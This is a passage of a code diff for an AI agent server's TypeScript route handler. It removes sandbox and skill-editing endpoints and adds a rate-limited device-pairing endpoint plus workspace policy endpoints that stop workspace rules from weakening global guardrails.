@@ -15,19 +15,15 @@ import {
   readFileSync,
   readdirSync,
   realpathSync,
-  rmSync,
   statSync,
   unlinkSync,
-  writeFileSync,
 } from "node:fs";
-import { join, resolve, extname, dirname } from "node:path";
-import { tmpdir, homedir, hostname } from "node:os";
+import { join, resolve, extname } from "node:path";
+import { homedir, hostname } from "node:os";
 import type { Storage } from "./storage.js";
 import type { SessionManager } from "./sessions.js";
 import type { GateServer } from "./gate.js";
-import type { SandboxManager } from "./sandbox.js";
 import type { SkillRegistry, UserSkillStore } from "./skills.js";
-import { SkillValidationError } from "./skills.js";
 import type { UserStreamMux } from "./stream.js";
 import {
   readSessionTrace,
@@ -37,17 +33,17 @@ import {
   findToolOutput,
   type TraceViewMode,
 } from "./trace.js";
+import { PolicyEngine, defaultPolicy, type PathAccess } from "./policy.js";
 import {
   collectFileMutations,
   reconstructBaselineFromCurrent,
   computeDiffLines,
   computeLineDiffStatsFromLines,
 } from "./overall-diff.js";
+import { ensureIdentityMaterial, identityConfigForDataDir } from "./security.js";
 import { buildWorkspaceGraph } from "./graph.js";
-import { ensureIdentityMaterial } from "./security.js";
 import { discoverProjects, scanDirectories } from "./host.js";
 import { isValidExtensionName, listHostExtensions } from "./extension-loader.js";
-import { PRESETS, type RiskLevel } from "./policy.js";
 import type { LearnedRule } from "./rules.js";
 import type { AuditEntry } from "./audit.js";
 import type {
@@ -56,9 +52,11 @@ import type {
   CreateWorkspaceRequest,
   UpdateWorkspaceRequest,
   RegisterDeviceTokenRequest,
+  PairDeviceRequest,
   ClientLogUploadRequest,
   ApiError,
-  SecurityProfile,
+  PolicyPermission,
+  PolicyDecision,
 } from "./types.js";
 
 function ts(): string {
@@ -79,7 +77,6 @@ export interface RouteContext {
   storage: Storage;
   sessions: SessionManager;
   gate: GateServer;
-  sandbox: SandboxManager;
   skillRegistry: SkillRegistry;
   userSkillStore: UserSkillStore;
   streamMux: UserStreamMux;
@@ -93,32 +90,16 @@ export interface RouteContext {
   piVersion: string;
 }
 
-type PolicyPresetName = keyof typeof PRESETS;
-
-interface PolicyProfileItem {
-  id: string;
-  title: string;
-  description?: string;
-  risk: RiskLevel;
-  example?: string;
-}
-
-interface PolicyProfileResponse {
-  workspaceId?: string;
-  workspaceName?: string;
-  runtime: "host" | "container";
-  policyPreset: PolicyPresetName;
-  supervisionLevel: "standard" | "high";
-  summary: string;
-  generatedAt: number;
-  alwaysBlocked: PolicyProfileItem[];
-  needsApproval: PolicyProfileItem[];
-  usuallyAllowed: string[];
-}
-
 // ─── Route Handler ───
 
 export class RouteHandler {
+  private static readonly PAIRING_MAX_FAILURES = 5;
+  private static readonly PAIRING_WINDOW_MS = 60_000;
+  private static readonly PAIRING_COOLDOWN_MS = 120_000;
+
+  private pairingFailuresBySource = new Map<string, number[]>();
+  private pairingBlockedUntilBySource = new Map<string, number>();
+
   constructor(private ctx: RouteContext) {}
 
   /**
@@ -137,17 +118,16 @@ export class RouteHandler {
       return this.handleGetUserStreamEvents(url, res);
     if (path === "/permissions/pending" && method === "GET")
       return this.handleGetPendingPermissions(url, res);
-    if (path === "/security/profile" && method === "GET") return this.handleGetSecurityProfile(res);
-    if (path === "/security/profile" && method === "PUT")
-      return this.handleUpdateSecurityProfile(req, res);
-    if (path === "/policy/profile" && method === "GET")
-      return this.handleGetPolicyProfile(url, res);
     if (path === "/policy/rules" && method === "GET")
       return this.handleGetPolicyRules(url, res);
+    if (path.startsWith("/policy/rules/") && method === "PATCH")
+      return this.handlePatchPolicyRule(path, req, res);
     if (path.startsWith("/policy/rules/") && method === "DELETE")
       return this.handleDeletePolicyRule(path, res);
     if (path === "/policy/audit" && method === "GET")
       return this.handleGetPolicyAudit(url, res);
+    if (path === "/pair" && method === "POST")
+      return this.handlePair(req, res);
     if (path === "/me" && method === "GET") return this.handleGetMe(res);
     if (path === "/server/info" && method === "GET") return this.handleGetServerInfo(res);
     if (path === "/models" && method === "GET") return this.handleListModels(res);
@@ -177,6 +157,23 @@ export class RouteHandler {
       if (method === "GET") return this.handleGetWorkspace(wsMatch[1], res);
       if (method === "PUT") return this.handleUpdateWorkspace(wsMatch[1], req, res);
       if (method === "DELETE") return this.handleDeleteWorkspace(wsMatch[1], res);
+    }
+
+    const wsPolicyMatch = path.match(/^\/workspaces\/([^/]+)\/policy$/);
+    if (wsPolicyMatch) {
+      if (method === "GET") return this.handleGetWorkspacePolicy(wsPolicyMatch[1], res);
+      if (method === "PATCH") return this.handlePatchWorkspacePolicy(wsPolicyMatch[1], req, res);
+    }
+
+    const wsPolicyPermissionDeleteMatch = path.match(
+      /^\/workspaces\/([^/]+)\/policy\/permissions\/([^/]+)$/,
+    );
+    if (wsPolicyPermissionDeleteMatch && method === "DELETE") {
+      return this.handleDeleteWorkspacePolicyPermission(
+        wsPolicyPermissionDeleteMatch[1],
+        decodeURIComponent(wsPolicyPermissionDeleteMatch[2]),
+        res,
+      );
     }
 
     const wsGraphMatch = path.match(/^\/workspaces\/([^/]+)\/graph$/);
@@ -299,144 +296,77 @@ export class RouteHandler {
 
   // ─── Route Handlers ───
 
-  private handleGetSecurityProfile(res: ServerResponse): void {
-    this.json(res, this.buildSecurityProfileResponse());
+  private pairingSourceKey(req: IncomingMessage): string {
+    return req.socket.remoteAddress || "unknown";
   }
 
-  private async handleUpdateSecurityProfile(
-    req: IncomingMessage,
-    res: ServerResponse,
-  ): Promise<void> {
-    const body = await this.parseBody<{
-      profile?: SecurityProfile;
-      requireTlsOutsideTailnet?: boolean;
-      allowInsecureHttpInTailnet?: boolean;
-      requirePinnedServerIdentity?: boolean;
-      invite?: { maxAgeSeconds?: number };
-    }>(req);
+  private isPairingRateLimited(source: string, now: number): boolean {
+    const blockedUntil = this.pairingBlockedUntilBySource.get(source) || 0;
+    if (blockedUntil > now) {
+      return true;
+    }
 
-    const allowedProfiles: SecurityProfile[] = ["tailscale-permissive", "strict"];
-    if (body.profile !== undefined && !allowedProfiles.includes(body.profile)) {
-      this.error(res, 400, `profile must be one of: ${allowedProfiles.join(", ")}`);
+    if (blockedUntil > 0 && blockedUntil <= now) {
+      this.pairingBlockedUntilBySource.delete(source);
+      this.pairingFailuresBySource.delete(source);
+    }
+
+    return false;
+  }
+
+  private recordPairingFailure(source: string, now: number): void {
+    const windowStart = now - RouteHandler.PAIRING_WINDOW_MS;
+    const failures = (this.pairingFailuresBySource.get(source) || []).filter((ts) => ts >= windowStart);
+    failures.push(now);
+    this.pairingFailuresBySource.set(source, failures);
+
+    if (failures.length >= RouteHandler.PAIRING_MAX_FAILURES) {
+      this.pairingBlockedUntilBySource.set(source, now + RouteHandler.PAIRING_COOLDOWN_MS);
+    }
+  }
+
+  private clearPairingFailures(source: string): void {
+    this.pairingFailuresBySource.delete(source);
+    this.pairingBlockedUntilBySource.delete(source);
+  }
+
+  private async handlePair(req: IncomingMessage, res: ServerResponse): Promise<void> {
+    const source = this.pairingSourceKey(req);
+    const now = Date.now();
+    if (this.isPairingRateLimited(source, now)) {
+      this.error(res, 429, "Too many invalid pairing attempts. Try again later.");
       return;
     }
 
-    const boolFields: Array<
-      keyof Pick<
-        typeof body,
-        "requireTlsOutsideTailnet" | "allowInsecureHttpInTailnet" | "requirePinnedServerIdentity"
-      >
-    > = ["requireTlsOutsideTailnet", "allowInsecureHttpInTailnet", "requirePinnedServerIdentity"];
+    const body = await this.parseBody<PairDeviceRequest>(req);
+    const pairingToken = typeof body.pairingToken === "string" ? body.pairingToken.trim() : "";
 
-    for (const key of boolFields) {
-      const value = body[key];
-      if (value !== undefined && typeof value !== "boolean") {
-        this.error(res, 400, `${key} must be boolean`);
-        return;
-      }
+    if (!pairingToken) {
+      this.error(res, 400, "pairingToken required");
+      return;
     }
 
-    if (body.invite !== undefined) {
-      const invite = body.invite as unknown;
-      if (typeof invite !== "object" || invite === null || Array.isArray(invite)) {
-        this.error(res, 400, "invite must be an object");
-        return;
-      }
-
-      const maxAgeSeconds = body.invite.maxAgeSeconds;
-      if (maxAgeSeconds !== undefined) {
-        if (!Number.isInteger(maxAgeSeconds) || maxAgeSeconds < 1 || maxAgeSeconds > 86_400) {
-          this.error(res, 400, "invite.maxAgeSeconds must be an integer between 1 and 86400");
-          return;
-        }
-      }
+    const deviceToken = this.ctx.storage.consumePairingToken(pairingToken);
+    if (!deviceToken) {
+      this.recordPairingFailure(source, now);
+      this.error(res, 401, "Invalid or expired pairing token");
+      return;
     }
 
-    const current = this.ctx.storage.getConfig();
-    const security = {
-      profile: body.profile ?? current.security?.profile ?? "tailscale-permissive",
-      requireTlsOutsideTailnet:
-        body.requireTlsOutsideTailnet ?? current.security?.requireTlsOutsideTailnet ?? false,
-      allowInsecureHttpInTailnet:
-        body.allowInsecureHttpInTailnet ?? current.security?.allowInsecureHttpInTailnet ?? true,
-      requirePinnedServerIdentity:
-        body.requirePinnedServerIdentity ?? current.security?.requirePinnedServerIdentity ?? false,
-    };
-
-    this.ctx.storage.updateConfig({
-      security,
-      ...(body.invite?.maxAgeSeconds !== undefined
-        ? {
-            invite: {
-              format: current.invite?.format ?? "v2-signed",
-              singleUse: current.invite?.singleUse ?? false,
-              maxAgeSeconds: body.invite.maxAgeSeconds,
-            },
-          }
-        : {}),
-    });
-
-    this.json(res, this.buildSecurityProfileResponse());
-  }
-
-  private buildSecurityProfileResponse(): Record<string, unknown> {
-    const config = this.ctx.storage.getConfig();
-
-    const security = config.security;
-    const identityConfig = config.identity;
-    const invite = config.invite;
-
-    let keyId = identityConfig?.keyId ?? "";
-    let algorithm = identityConfig?.algorithm ?? "ed25519";
-    let fingerprint = identityConfig?.fingerprint ?? "";
-
-    if (identityConfig?.enabled) {
-      try {
-        const identity = ensureIdentityMaterial(identityConfig);
-        keyId = identity.keyId;
-        algorithm = "ed25519";
-        fingerprint = identity.fingerprint;
-
-        if (identityConfig.fingerprint !== identity.fingerprint) {
-          this.ctx.storage.updateConfig({
-            identity: {
-              ...identityConfig,
-              fingerprint: identity.fingerprint,
-            },
-          });
-        }
-      } catch (err: unknown) {
-        const message = err instanceof Error ? err.message : String(err);
-        console.warn(`[security] failed to load identity material: ${message}`);
-      }
-    }
-
-    return {
-      configVersion: config.configVersion ?? 1,
-      profile: security?.profile ?? "tailscale-permissive",
-      requireTlsOutsideTailnet: security?.requireTlsOutsideTailnet ?? false,
-      allowInsecureHttpInTailnet: security?.allowInsecureHttpInTailnet ?? true,
-      requirePinnedServerIdentity: security?.requirePinnedServerIdentity ?? false,
-      identity: {
-        enabled: identityConfig?.enabled ?? false,
-        algorithm,
-        keyId,
-        fingerprint,
-      },
-      invite: {
-        format: invite?.format ?? "v2-signed",
-        maxAgeSeconds: invite?.maxAgeSeconds ?? 600,
-      },
-    };
+    this.clearPairingFailures(source);
+    this.json(res, { deviceToken });
   }
 
   private handleGetMe(res: ServerResponse): void {
-    this.json(res, { name: this.ctx.storage.getOwnerName() });
+    // Keep a stable single-user identifier for iOS decode compatibility.
+    this.json(res, {
+      user: "owner",
+      name: this.ctx.storage.getOwnerName(),
+    });
   }
 
   private handleGetServerInfo(res: ServerResponse): void {
     const config = this.ctx.storage.getConfig();
-    const identity = config.identity;
     const workspaces = this.ctx.storage.listWorkspaces();
     const sessions = this.ctx.storage.listSessions();
     const activeSessions = sessions.filter(
@@ -444,6 +374,18 @@ export class RouteHandler {
     );
 
     const uptimeSeconds = Math.floor((Date.now() - this.ctx.serverStartedAt) / 1000);
+
+    let identity: { fingerprint: string; keyId: string; algorithm: "ed25519" } | null = null;
+    try {
+      const material = ensureIdentityMaterial(identityConfigForDataDir(this.ctx.storage.getDataDir()));
+      identity = {
+        fingerprint: material.fingerprint,
+        keyId: material.keyId,
+        algorithm: material.algorithm,
+      };
+    } catch {
+      identity = null;
+    }
 
     this.json(res, {
       name: hostname(),
@@ -455,13 +397,7 @@ export class RouteHandler {
       nodeVersion: process.version,
       piVersion: this.ctx.piVersion,
       configVersion: config.configVersion ?? 1,
-      identity: identity
-        ? {
-            fingerprint: identity.fingerprint,
-            keyId: identity.keyId,
-            algorithm: identity.algorithm,
-          }
-        : null,
+      identity,
       stats: {
         workspaceCount: workspaces.length,
         activeSessionCount: activeSessions.length,
@@ -514,7 +450,7 @@ export class RouteHandler {
     this.json(res, { content });
   }
 
-  // ─── User Skills CRUD ───
+  // ─── User Skills (read-only; mutation disabled) ───
 
   private handleListUserSkills(res: ServerResponse): void {
     // Build enabledIn map: skill name → workspace IDs
@@ -562,165 +498,27 @@ export class RouteHandler {
   }
 
   private async handleSaveUserSkill(
-    req: IncomingMessage,
+    _req: IncomingMessage,
     res: ServerResponse,
   ): Promise<void> {
-    const body = await this.parseBody<{ name: string; sessionId: string; path?: string }>(req);
-
-    if (!body.name) {
-      this.error(res, 400, "name required");
-      return;
-    }
-    if (!body.sessionId) {
-      this.error(res, 400, "sessionId required");
-      return;
-    }
-
-    const session = this.ctx.storage.getSession(body.sessionId);
-    if (!session) {
-      this.error(res, 404, "Session not found");
-      return;
-    }
-
-    const workRoot = this.resolveWorkRoot(session);
-    if (!workRoot) {
-      this.error(res, 404, "No workspace root for session");
-      return;
-    }
-
-    const relPath = body.path ?? body.name;
-    const sourceDir = resolve(workRoot, relPath);
-
-    let resolvedSource: string;
-    try {
-      resolvedSource = realpathSync(sourceDir);
-    } catch {
-      this.error(res, 404, "Source directory not found");
-      return;
-    }
-
-    const realWorkRoot = realpathSync(workRoot);
-    if (!resolvedSource.startsWith(realWorkRoot + "/") && resolvedSource !== realWorkRoot) {
-      this.error(res, 403, "Path outside workspace");
-      return;
-    }
-
-    try {
-      const skill = this.ctx.userSkillStore.saveSkill(body.name, resolvedSource);
-      // scan() first (re-reads disk), then register user skill on top
-      this.ctx.skillRegistry.scan();
-      this.ctx.skillRegistry.registerUserSkills([skill]);
-      this.json(res, { skill }, 201);
-    } catch (err) {
-      if (err instanceof SkillValidationError) {
-        this.error(res, 400, err.message);
-        return;
-      }
-      throw err;
-    }
+    this.error(res, 403, "Skill editing is disabled on remote clients");
   }
 
   /**
-   * PUT /me/skills/:name — create or update a user skill with inline content.
+   * PUT /me/skills/:name
    *
-   * Body: { content: string, files?: Record<string, string> }
-   *   content: SKILL.md content (required)
-   *   files: optional extra files as { "scripts/run.sh": "#!/bin/bash\n..." }
+   * Skill mutation is intentionally disabled for remote clients.
    */
   private async handlePutUserSkill(
-    name: string,
-    req: IncomingMessage,
+    _name: string,
+    _req: IncomingMessage,
     res: ServerResponse,
   ): Promise<void> {
-    const body = await this.parseBody<{
-      content: string;
-      files?: Record<string, string>;
-    }>(req);
-
-    if (!body.content) {
-      this.error(res, 400, "content (SKILL.md) required");
-      return;
-    }
-
-    // Check if this is an existing skill (built-in or user) — write in-place.
-    const existing = this.ctx.skillRegistry.get(name);
-    if (existing) {
-      // Write directly to the skill's on-disk location
-      try {
-        writeFileSync(join(existing.path, "SKILL.md"), body.content);
-        if (body.files) {
-          for (const [relPath, fileContent] of Object.entries(body.files)) {
-            if (relPath.includes("..") || relPath.startsWith("/")) {
-              this.error(res, 400, `Invalid file path: ${relPath}`);
-              return;
-            }
-            const dir = dirname(join(existing.path, relPath));
-            mkdirSync(dir, { recursive: true });
-            writeFileSync(join(existing.path, relPath), fileContent);
-          }
-        }
-        // Re-scan picks up changes; re-register user skills after (scan clears map)
-        this.ctx.skillRegistry.scan();
-        const userSkills = this.ctx.userSkillStore.listSkills();
-        this.ctx.skillRegistry.registerUserSkills(userSkills);
-        const updated = this.ctx.skillRegistry.get(name);
-        this.json(res, { skill: updated ?? existing });
-        return;
-      } catch (err) {
-        this.error(res, 500, `Failed to write skill: ${err instanceof Error ? err.message : String(err)}`);
-        return;
-      }
-    }
-
-    // New user skill — write via UserSkillStore
-    const tmpDir = join(tmpdir(), `oppi-skill-${name}-${Date.now()}`);
-    try {
-      mkdirSync(tmpDir, { recursive: true });
-      writeFileSync(join(tmpDir, "SKILL.md"), body.content);
-
-      if (body.files) {
-        for (const [relPath, fileContent] of Object.entries(body.files)) {
-          if (relPath.includes("..") || relPath.startsWith("/")) {
-            this.error(res, 400, `Invalid file path: ${relPath}`);
-            return;
-          }
-          const dir = dirname(join(tmpDir, relPath));
-          mkdirSync(dir, { recursive: true });
-          writeFileSync(join(tmpDir, relPath), fileContent);
-        }
-      }
-
-      const skill = this.ctx.userSkillStore.saveSkill(name, tmpDir);
-      this.ctx.skillRegistry.scan();
-      this.ctx.skillRegistry.registerUserSkills([skill]);
-      this.json(res, { skill });
-    } catch (err) {
-      if (err instanceof SkillValidationError) {
-        this.error(res, 400, err.message);
-        return;
-      }
-      throw err;
-    } finally {
-      rmSync(tmpDir, { recursive: true, force: true });
-    }
+    this.error(res, 403, "Skill editing is disabled on remote clients");
   }
 
-  private handleDeleteUserSkill(name: string, res: ServerResponse): void {
-    const builtIn = this.ctx.skillRegistry.get(name);
-    const userSkill = this.ctx.userSkillStore.getSkill(name);
-
-    if (!userSkill) {
-      if (builtIn) {
-        this.error(res, 403, "Cannot delete built-in skill");
-        return;
-      }
-      this.error(res, 404, "Skill not found");
-      return;
-    }
-
-    this.ctx.userSkillStore.deleteSkill(name);
-    this.ctx.skillRegistry.scan(); // refresh catalog
-    res.writeHead(204).end();
+  private handleDeleteUserSkill(_name: string, res: ServerResponse): void {
+    this.error(res, 403, "Skill editing is disabled on remote clients");
   }
 
   private handleGetUserSkillFile(name: string, url: URL, res: ServerResponse): void {
@@ -773,16 +571,6 @@ export class RouteHandler {
       return;
     }
 
-    if (body.runtime && body.runtime !== "host" && body.runtime !== "container") {
-      this.error(res, 400, 'runtime must be "host" or "container"');
-      return;
-    }
-
-    if (body.policyPreset && !this.isValidPolicyPreset(body.policyPreset)) {
-      this.error(res, 400, `policyPreset must be one of: ${Object.keys(PRESETS).join(", ")}`);
-      return;
-    }
-
     if (body.memoryNamespace && !this.ctx.isValidMemoryNamespace(body.memoryNamespace)) {
       this.error(res, 400, "memoryNamespace must match [a-zA-Z0-9][a-zA-Z0-9._-]{0,63}");
       return;
@@ -800,6 +588,33 @@ export class RouteHandler {
       if (invalid.length > 0) {
         this.error(res, 400, `Invalid extension names: ${invalid.join(", ")}`);
         return;
+      }
+    }
+
+    if (body.policy?.fallback !== undefined) {
+      if (
+        body.policy.fallback !== "allow" &&
+        body.policy.fallback !== "ask" &&
+        body.policy.fallback !== "block"
+      ) {
+        this.error(res, 400, "policy.fallback must be one of allow|ask|block");
+        return;
+      }
+    }
+
+    if (body.policy?.permissions) {
+      for (const permission of body.policy.permissions) {
+        const validationError = this.validateWorkspacePolicyPermission(permission);
+        if (validationError) {
+          this.error(res, 400, validationError);
+          return;
+        }
+
+        const additiveError = this.validateAdditiveWorkspacePermission(permission);
+        if (additiveError) {
+          this.error(res, 400, additiveError);
+          return;
+        }
       }
     }
 
@@ -829,16 +644,6 @@ export class RouteHandler {
 
     const body = await this.parseBody<UpdateWorkspaceRequest>(req);
 
-    if (body.runtime && body.runtime !== "host" && body.runtime !== "container") {
-      this.error(res, 400, 'runtime must be "host" or "container"');
-      return;
-    }
-
-    if (body.policyPreset && !this.isValidPolicyPreset(body.policyPreset)) {
-      this.error(res, 400, `policyPreset must be one of: ${Object.keys(PRESETS).join(", ")}`);
-      return;
-    }
-
     if (body.skills) {
       const unknown = body.skills.filter((s) => !this.ctx.skillRegistry.get(s));
       if (unknown.length > 0) {
@@ -867,15 +672,37 @@ export class RouteHandler {
       }
     }
 
+    if (body.policy?.fallback !== undefined) {
+      if (
+        body.policy.fallback !== "allow" &&
+        body.policy.fallback !== "ask" &&
+        body.policy.fallback !== "block"
+      ) {
+        this.error(res, 400, "policy.fallback must be one of allow|ask|block");
+        return;
+      }
+    }
+
+    if (body.policy?.permissions) {
+      for (const permission of body.policy.permissions) {
+        const validationError = this.validateWorkspacePolicyPermission(permission);
+        if (validationError) {
+          this.error(res, 400, validationError);
+          return;
+        }
+
+        const additiveError = this.validateAdditiveWorkspacePermission(permission);
+        if (additiveError) {
+          this.error(res, 400, additiveError);
+          return;
+        }
+      }
+    }
+
     const updated = this.ctx.storage.updateWorkspace(wsId, body);
     if (!updated) {
       this.error(res, 404, "Workspace not found");
       return;
-    }
-
-    // If skills changed on a container workspace, re-sync the sandbox
-    if (body.skills && updated.runtime === "container") {
-      this.ctx.sandbox.resyncWorkspaceSkills(wsId, updated.skills);
     }
 
     this.json(res, { workspace: updated });
@@ -884,6 +711,249 @@ export class RouteHandler {
   private handleDeleteWorkspace(wsId: string, res: ServerResponse): void {
     this.ctx.storage.deleteWorkspace(wsId);
     this.json(res, { ok: true });
+  }
+
+  private handleGetWorkspacePolicy(wsId: string, res: ServerResponse): void {
+    const workspace = this.ctx.storage.getWorkspace(wsId);
+    if (!workspace) {
+      this.error(res, 404, "Workspace not found");
+      return;
+    }
+
+    const globalPolicy = this.ctx.storage.getConfig().policy;
+    const workspacePolicy = workspace.policy || { permissions: [] };
+
+    this.json(res, {
+      workspaceId: wsId,
+      globalPolicy,
+      workspacePolicy,
+      effectivePolicy: {
+        fallback: workspacePolicy.fallback ?? globalPolicy?.fallback ?? "ask",
+        guardrails: globalPolicy?.guardrails ?? [],
+        permissions: [...(globalPolicy?.permissions ?? []), ...workspacePolicy.permissions],
+      },
+    });
+  }
+
+  private refreshActiveWorkspaceSessionPolicies(workspace: Workspace): void {
+    const sessions = this.ctx.storage.listSessions();
+
+    const cwd = workspace.hostMount ? workspace.hostMount.replace(/^~/, homedir()) : homedir();
+    const allowedPaths: PathAccess[] = [
+      { path: cwd, access: "readwrite" },
+      { path: join(homedir(), ".pi"), access: "read" },
+    ];
+
+    if (workspace.allowedPaths) {
+      for (const entry of workspace.allowedPaths) {
+        allowedPaths.push({
+          path: entry.path.replace(/^~/, homedir()),
+          access: entry.access,
+        });
+      }
+    }
+
+    const globalPolicy = this.ctx.storage.getConfig().policy;
+    const mergedGlobalPolicy = globalPolicy
+      ? {
+          ...globalPolicy,
+          fallback: workspace.policy?.fallback ?? globalPolicy.fallback,
+          permissions: [...globalPolicy.permissions, ...(workspace.policy?.permissions || [])],
+        }
+      : undefined;
+
+    const policySource = mergedGlobalPolicy || defaultPolicy();
+    const allowedExecutables = workspace.allowedExecutables;
+
+    let refreshed = 0;
+
+    for (const session of sessions) {
+      if (session.workspaceId !== workspace.id) continue;
+      if (!this.ctx.sessions.isActive(session.id)) continue;
+
+      this.ctx.gate.setSessionPolicy(
+        session.id,
+        new PolicyEngine(policySource, { allowedPaths, allowedExecutables }),
+      );
+      refreshed += 1;
+    }
+
+    if (refreshed > 0) {
+      console.log(
+        `${ts()} [policy] refreshed session policy for workspace ${workspace.id} (${refreshed} active session${refreshed === 1 ? "" : "s"})`,
+      );
+    }
+  }
+
+  private async handlePatchWorkspacePolicy(
+    wsId: string,
+    req: IncomingMessage,
+    res: ServerResponse,
+  ): Promise<void> {
+    const workspace = this.ctx.storage.getWorkspace(wsId);
+    if (!workspace) {
+      this.error(res, 404, "Workspace not found");
+      return;
+    }
+
+    const body = await this.parseBody<{
+      permissions?: PolicyPermission[];
+      fallback?: PolicyDecision;
+    }>(req);
+
+    const hasPermissions = Object.prototype.hasOwnProperty.call(body, "permissions");
+    const hasFallback = Object.prototype.hasOwnProperty.call(body, "fallback");
+
+    if (!hasPermissions && !hasFallback) {
+      this.error(res, 400, "permissions or fallback must be provided");
+      return;
+    }
+
+    if (hasPermissions && !Array.isArray(body.permissions)) {
+      this.error(res, 400, "permissions must be an array when provided");
+      return;
+    }
+
+    let fallback = workspace.policy?.fallback;
+    if (hasFallback) {
+      if (body.fallback !== "allow" && body.fallback !== "ask" && body.fallback !== "block") {
+        this.error(res, 400, "fallback must be one of allow|ask|block");
+        return;
+      }
+      fallback = body.fallback;
+    }
+
+    const incomingPermissions = body.permissions || [];
+    for (const permission of incomingPermissions) {
+      const validationError = this.validateWorkspacePolicyPermission(permission);
+      if (validationError) {
+        this.error(res, 400, validationError);
+        return;
+      }
+
+      const additiveError = this.validateAdditiveWorkspacePermission(permission);
+      if (additiveError) {
+        this.error(res, 400, additiveError);
+        return;
+      }
+    }
+
+    const existing = workspace.policy?.permissions || [];
+    const mergedById = new Map<string, PolicyPermission>();
+    for (const permission of existing) mergedById.set(permission.id, permission);
+    for (const permission of incomingPermissions) mergedById.set(permission.id, permission);
+
+    const updated = this.ctx.storage.setWorkspacePolicyPermissions(
+      wsId,
+      Array.from(mergedById.values()),
+      fallback,
+    );
+    if (!updated) {
+      this.error(res, 404, "Workspace not found");
+      return;
+    }
+
+    this.refreshActiveWorkspaceSessionPolicies(updated);
+
+    this.json(res, { workspace: updated, policy: updated.policy || { permissions: [] } });
+  }
+
+  private handleDeleteWorkspacePolicyPermission(
+    wsId: string,
+    permissionId: string,
+    res: ServerResponse,
+  ): void {
+    const workspace = this.ctx.storage.getWorkspace(wsId);
+    if (!workspace) {
+      this.error(res, 404, "Workspace not found");
+      return;
+    }
+
+    const updated = this.ctx.storage.deleteWorkspacePolicyPermission(wsId, permissionId);
+    if (!updated) {
+      this.error(res, 404, "Workspace not found");
+      return;
+    }
+
+    this.refreshActiveWorkspaceSessionPolicies(updated);
+
+    this.json(res, { workspace: updated, policy: updated.policy || { permissions: [] } });
+  }
+
+  private validateWorkspacePolicyPermission(permission: PolicyPermission): string | null {
+    if (!permission || typeof permission !== "object") return "permission entry must be an object";
+    if (typeof permission.id !== "string" || !/^[a-z0-9][a-z0-9._-]{2,63}$/.test(permission.id)) {
+      return "permission.id must be slug-like (3-64 chars)";
+    }
+
+    if (!["allow", "ask", "block"].includes(permission.decision)) {
+      return `permission ${permission.id}: decision must be one of allow|ask|block`;
+    }
+
+    if (!permission.match || typeof permission.match !== "object") {
+      return `permission ${permission.id}: match object required`;
+    }
+
+    const hasMatchField = [
+      permission.match.tool,
+      permission.match.executable,
+      permission.match.commandMatches,
+      permission.match.pathMatches,
+      permission.match.pathWithin,
+      permission.match.domain,
+    ].some((value) => typeof value === "string" && value.trim().length > 0);
+
+    if (!hasMatchField) {
+      return `permission ${permission.id}: at least one match field required`;
+    }
+
+    return null;
+  }
+
+  private permissionMatchKey(permission: PolicyPermission): string {
+    const match = permission.match;
+    return [
+      match.tool || "",
+      match.executable || "",
+      match.commandMatches || "",
+      match.pathMatches || "",
+      match.pathWithin || "",
+      match.domain || "",
+    ].join("|");
+  }
+
+  private decisionRank(decision: "allow" | "ask" | "block"): number {
+    // Lower is more permissive. Workspace overrides must not reduce strictness.
+    if (decision === "allow") return 0;
+    if (decision === "ask") return 1;
+    return 2;
+  }
+
+  private validateAdditiveWorkspacePermission(permission: PolicyPermission): string | null {
+    const globalPolicy = this.ctx.storage.getConfig().policy;
+    if (!globalPolicy) return null;
+
+    const key = this.permissionMatchKey(permission);
+
+    const matchingGuardrail = globalPolicy.guardrails.find(
+      (rule) => this.permissionMatchKey(rule) === key,
+    );
+    if (matchingGuardrail?.immutable) {
+      return `permission ${permission.id}: cannot override immutable global guardrail ${matchingGuardrail.id}`;
+    }
+
+    const matchingGlobalPermission = globalPolicy.permissions.find(
+      (rule) => this.permissionMatchKey(rule) === key,
+    );
+    if (!matchingGlobalPermission) return null;
+
+    const requested = this.decisionRank(permission.decision);
+    const baseline = this.decisionRank(matchingGlobalPermission.decision);
+    if (requested < baseline) {
+      return `permission ${permission.id}: cannot weaken global decision ${matchingGlobalPermission.decision} for matching rule ${matchingGlobalPermission.id}`;
+    }
+
+    return null;
   }
 
   private handleGetWorkspaceGraph(
@@ -952,7 +1022,7 @@ export class RouteHandler {
       this.ctx.storage.setLiveActivityToken(body.deviceToken);
       console.log(`[push] Live Activity token registered for ${this.ctx.storage.getOwnerName()}`);
     } else {
-      this.ctx.storage.addDeviceToken(body.deviceToken);
+      this.ctx.storage.addPushDeviceToken(body.deviceToken);
       console.log(`[push] Device token registered for ${this.ctx.storage.getOwnerName()}`);
     }
 
@@ -965,7 +1035,7 @@ export class RouteHandler {
   ): Promise<void> {
     const body = await this.parseBody<{ deviceToken: string }>(req);
     if (body.deviceToken) {
-      this.ctx.storage.removeDeviceToken(body.deviceToken);
+      this.ctx.storage.removePushDeviceToken(body.deviceToken);
       console.log(`[push] Device token removed for ${this.ctx.storage.getOwnerName()}`);
     }
     this.json(res, { ok: true });
@@ -1104,7 +1174,6 @@ export class RouteHandler {
 
     session.workspaceId = workspace.id;
     session.workspaceName = workspace.name;
-    session.runtime = workspace.runtime;
     this.ctx.storage.saveSession(session);
 
     const hydrated = this.ctx.ensureSessionContextWindow(session);
@@ -1209,7 +1278,6 @@ export class RouteHandler {
 
     forkSession.workspaceId = workspace.id;
     forkSession.workspaceName = workspace.name;
-    forkSession.runtime = workspace.runtime;
     forkSession.piSessionFile = sourceSessionFile;
     forkSession.piSessionFiles = Array.from(
       new Set([...(latestSource.piSessionFiles || []), sourceSessionFile]),
@@ -1281,34 +1349,6 @@ export class RouteHandler {
     }
 
     const jsonlPaths: string[] = [];
-    const sandboxBaseDir = this.ctx.sandbox.getBaseDir();
-
-    const containerDirs: string[] = [];
-    if (session.workspaceId) {
-      containerDirs.push(
-        join(
-          sandboxBaseDir,
-          session.workspaceId,
-          "sessions",
-          sessionId,
-          "agent",
-          "sessions",
-          "--work--",
-        ),
-      );
-    }
-
-    for (const containerDir of containerDirs) {
-      if (!existsSync(containerDir)) continue;
-      for (const f of readdirSync(containerDir)
-        .filter((f) => f.endsWith(".jsonl"))
-        .sort()) {
-        const p = join(containerDir, f);
-        if (!jsonlPaths.includes(p)) {
-          jsonlPaths.push(p);
-        }
-      }
-    }
 
     if (session.piSessionFiles?.length) {
       for (const p of session.piSessionFiles) {
@@ -1463,8 +1503,17 @@ export class RouteHandler {
     }
   }
 
+  private legacySandboxBaseDir(): string {
+    const storageWithDataDir = this.ctx.storage as Storage & {
